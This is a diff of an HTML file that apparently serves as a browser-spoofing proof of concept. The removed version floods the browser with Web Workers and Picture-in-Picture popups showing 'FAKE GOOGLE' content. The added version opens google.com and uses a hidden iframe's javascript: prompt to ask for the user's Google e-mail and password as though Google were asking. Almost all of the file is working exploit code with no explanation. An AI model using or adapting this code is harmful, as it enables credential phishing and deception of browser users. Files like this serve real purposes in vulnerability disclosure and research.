@@ -1,96 +1,25 @@
-<html lang="en"><head>
-   
-    
-  </head>
-
+<html>
   <body>
+
+    <script>
+
+    function exploit() {
+
+      window.open("https://www.google.com");
+
+      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
     
-    <h1>Race Condition PIP POC</h1>
-  
-  
-<div  style="width:1000px" id="output" class="output">
-  <div id="content">
-<div style="width:1000px"><button  id="buyButton" style="display: inline;width:1000px">Do some Clicks</button></div>
-
-
-</div>
-
-
-    
-      <script>
-
-
-
-const payButton = document.getElementById('buyButton');
-payButton.setAttribute('style', 'display: none;width:100px;margin-left:30%');
-var g=0;
-
-
-  payButton.setAttribute('style', 'display: inline;width:100px;margin-left:30%');
-  payButton.addEventListener('click', function() {
-    if(g==0)
-    {
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       new Worker('data:application/javascript,1');
-       setInterval("new Worker('data:application/javascript,1');",1);
-      setTimeout('window.top.location.href = "https://www.google.com"',2000);
     }
-  
-    g++;
-  });
- 
- 
-   const spoof = async () => {
-
-         
-            const popupPip = await documentPictureInPicture.requestWindow({
-                width: 918,
-                height: 1800
-            });
-
-
-            var p="<div onclick=\"alert(1)\" id='content'> <span style='opacity:1'><h1>FAKE GOOGLE DO click</h1></span><script>setTimeout('document.execCommand(\"copy\")',1);<\/script></div>";
-            //popupPip.document.body.append(content);
-			popupPip.document.write(p);
-        };
-  
-  
-  setInterval(spoof,1);
-
-
-</script>
     
-  
+    </script>
 
- 
+    <br><br><br><br>
 
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
+
+    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+
+  </body>
+</html>
